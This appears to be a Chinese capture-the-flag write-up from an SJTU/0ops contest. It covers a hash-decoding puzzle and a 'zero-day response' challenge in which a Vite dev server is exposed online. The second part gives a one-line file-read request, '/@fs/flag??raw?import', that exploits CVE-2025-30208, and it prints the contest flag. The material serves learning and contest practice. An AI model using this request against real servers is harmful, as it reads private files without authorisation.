> 11010100 10000001 10001101 01111010 10001111 11110001 11100010 01100011 10001101 01111001 10110110 11101100 11010011 10011000 10111110 10110001 01010110 11010000 01111000 10101001 11111100 00111111 10011000 11000100 00110110 00111010 11001010 10001101 10000111 01101101 11000110 00100110
>
> 你知道它是什么的，对吧？
> 对的。我们在该文档中惊讶地发现了如下字段：

> 黑屏，渐次浮现二进制瀑布流（代码由SJTU校训「饮水思源」的SHA-256哈希转化而成）

然后惊讶地发现「饮水思源」的SHA-256哈希就是该二进制数

所以flag为`0ops{饮水思源}`（人在无语的时候真的会笑.jpg）

# Emergency

> 你知道如何快速响应零日漏洞吗？

```ts
import { defineConfig } from 'vite'
import fs from 'fs'

// https://vite.dev/config/
export default defineConfig({
  server: {
    allowedHosts: [".0ops.sjtu.cn"],
  },
  plugins: [
    {
      name: 'file-api',
      configureServer(server) {
        server.middlewares.use('/api/files', async (req, res, next) => {
          if ("0" === 1)
          {
            try {
              const filename = req.url
              const data = await fs.promises.readFile(filename)
              res.setHeader('Content-Type', 'application/octet-stream')
              res.end(data)
            } catch (error) {
              res.end(error.message)
            }
          }
          else
          {
            next();
          }
        })
      }
    }
  ],
})

```

呜呜真有人把dev server放在线上啊真好，直接上`/@fs/`读文件。额好像不太好读，查询`vite @fs`寻找该API的深入用法，直接找到了[CVE-2025-30208](https://nvd.nist.gov/vuln/detail/CVE-2025-30208)

访问`/@fs/flag??raw?import`得到flag

